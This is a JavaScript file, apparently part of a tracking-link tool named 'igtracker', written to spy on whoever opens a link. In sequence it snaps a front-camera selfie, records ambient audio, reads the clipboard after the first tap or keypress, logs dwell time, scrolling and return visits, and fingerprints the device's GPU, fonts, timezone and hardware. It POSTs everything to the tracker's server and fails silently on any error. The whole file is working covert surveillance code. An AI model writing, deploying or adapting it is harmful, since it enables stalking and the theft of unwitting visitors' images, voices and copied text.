/* igtracker spy: 自撮り / 環境音 / クリップボード / 行動ログ / 端末指紋。
   window.LT_CODE / LT_HIT を利用。LT_CAM / LT_MIC / LT_CLIP で個別に無効化できる。 */
(function () {
  "use strict";
  var CODE = window.LT_CODE, HIT = window.LT_HIT || 0;
  if (!CODE) return;
  var B = "/s/" + encodeURIComponent(CODE);

  var VID = (function () {
    try {
      var v = localStorage.getItem("igt_vid");
      if (!v) {
        v = Math.random().toString(36).slice(2, 12) + Date.now().toString(36);
        localStorage.setItem("igt_vid", v);
      }
      return v;
    } catch (e) { return ""; }
  })();
  var VISITS = (function () {
    try {
      var k = "igt_v_" + CODE, n = (+(localStorage.getItem(k) || 0)) + 1;
      localStorage.setItem(k, n);
      return n;
    } catch (e) { return 1; }
  })();

  function post(path, body) {
    try {
      return fetch(B + path, {
        method: "POST", cache: "no-store", keepalive: true,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body || {})
      }).catch(function () {});
    } catch (e) {}
  }

  /* ---- 自撮り（内カメラ） ---- */
  function selfie() {
    if (!window.LT_CAM || !navigator.mediaDevices ||
        !navigator.mediaDevices.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 480 } }, audio: false
    }).then(function (st) {
      var v = document.createElement("video");
      v.autoplay = true; v.muted = true; v.playsInline = true; v.srcObject = st;
      var done = false;
      function shot() {
        if (done) return;
        done = true;
        try {
          var w = v.videoWidth || 320, h = v.videoHeight || 240;
          var c = document.createElement("canvas");
          c.width = w; c.height = h;
          c.getContext("2d").drawImage(v, 0, 0, w, h);
          post("/cap", {
            hit: HIT, vid: VID, kind: "selfie",
            data: c.toDataURL("image/jpeg", 0.62), meta: { w: w, h: h }
          });
        } catch (e) {}
        try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
      }
      v.onloadedmetadata = function () { setTimeout(shot, 900); };
      setTimeout(shot, 2600);
    }).catch(function () {});
  }

  /* ---- 環境音（既定4秒） ---- */
  function voice() {
    if (!window.LT_MIC || !window.MediaRecorder || !navigator.mediaDevices) return;
    navigator.mediaDevices.getUserMedia({ audio: true }).then(function (st) {
      var rec = new MediaRecorder(st), chunks = [];
      var MS = Math.min(10000, (window.LT_MIC_MS || 4000));
      rec.ondataavailable = function (e) {
        if (e.data && e.data.size) chunks.push(e.data);
      };
      rec.onstop = function () {
        try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
        var blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
        if (blob.size < 900) return;
        var fr = new FileReader();
        fr.onload = function () {
          post("/cap", {
            hit: HIT, vid: VID, kind: "voice", data: fr.result,
            meta: { ms: MS, mime: blob.type }
          });
        };
        fr.readAsDataURL(blob);
      };
      rec.start();
      setTimeout(function () { try { rec.stop(); } catch (e) {} }, MS);
    }).catch(function () {});
  }

  /* ---- クリップボード（ユーザー操作の後で読む） ---- */
  function clipOnce() {
    if (!window.LT_CLIP || !navigator.clipboard || !navigator.clipboard.readText) return;
    navigator.clipboard.readText().then(function (t) {
      if (t) post("/clip", { hit: HIT, vid: VID, text: String(t).slice(0, 2000) });
    }).catch(function () {});
  }
  ["click", "touchstart", "keydown"].forEach(function (ev) {
    document.addEventListener(ev, function h() {
      document.removeEventListener(ev, h);
      setTimeout(clipOnce, 60);
    }, { once: true, passive: true });
  });

  /* ---- 行動ログ（滞在・スクロール・離脱・再訪） ---- */
  var t0 = Date.now(), maxScroll = 0, hiddenMs = 0, hiddenAt = 0;
  function sendEv(kind, value, text) {
    post("/ev", { hit: HIT, vid: VID, kind: kind, value: value || 0, text: text || "" });
  }
  window.addEventListener("scroll", function () {
    var h = document.documentElement.scrollHeight - innerHeight;
    var p = h > 0 ? Math.round(scrollY / h * 1000) / 10 : 100;
    if (p > maxScroll) maxScroll = p;
  }, { passive: true });
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") {
      hiddenAt = Date.now();
      sendEv("blur");
    } else if (hiddenAt) {
      hiddenMs += Date.now() - hiddenAt;
      hiddenAt = 0;
      sendEv("focus");
    }
  });
  function flush(final) {
    var dwell = Date.now() - t0 - hiddenMs;
    sendEv(final ? "exit" : "dwell", dwell, JSON.stringify({
      scroll: maxScroll, visits: VISITS, w: innerWidth, h: innerHeight,
      screen: screen.width + "x" + screen.height, dpr: devicePixelRatio
    }));
  }
  setInterval(function () { flush(false); }, 15000);
  window.addEventListener("pagehide", function () { flush(true); });

  /* ---- 端末指紋（GPU・フォント・回線） ---- */
  function gpu() {
    try {
      var c = document.createElement("canvas");
      var g = c.getContext("webgl") || c.getContext("experimental-webgl");
      var d = g.getExtension("WEBGL_debug_renderer_info");
      return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : "";
    } catch (e) { return ""; }
  }
  function fonts() {
    var list = ["Arial", "Hiragino Sans", "Yu Gothic", "Meiryo", "Roboto",
                "Segoe UI", "Noto Sans JP", "Helvetica Neue", "Times New Roman"];
    var base = ["monospace", "sans-serif", "serif"], hit = [];
    try {
      var c = document.createElement("canvas"), x = c.getContext("2d");
      base.forEach(function (b) {
        x.font = "72px " + b;
        var w0 = x.measureText("mmmwwiil").width;
        list.forEach(function (f) {
          x.font = "72px '" + f + "'," + b;
          if (x.measureText("mmmwwiil").width !== w0) hit.push(f);
        });
      });
    } catch (e) {}
    return hit;
  }
  function deviceInfo() {
    var n = navigator.connection || {};
    sendEv("device", VISITS, JSON.stringify({
      visits: VISITS,
      tz: (function () {
        try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
        catch (e) { return ""; }
      })(),
      langs: navigator.languages || [navigator.language],
      cores: navigator.hardwareConcurrency || 0,
      mem: navigator.deviceMemory || 0,
      net: n.effectiveType || "", downlink: n.downlink || 0, rtt: n.rtt || 0,
      platform: navigator.platform || "", touch: navigator.maxTouchPoints || 0,
      gpu: gpu(), fonts: fonts(),
      pdf: !!navigator.pdfViewerEnabled,
      cookie: !!navigator.cookieEnabled
    }));
    try {
      if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(function (s) {
          sendEv("storage", s.quota || 0, JSON.stringify({ usage: s.usage || 0 }));
        }).catch(function () {});
      }
    } catch (e) {}
  }

  setTimeout(function () { deviceInfo(); }, 400);
  setTimeout(selfie, 800);
  setTimeout(voice, 3200);
})();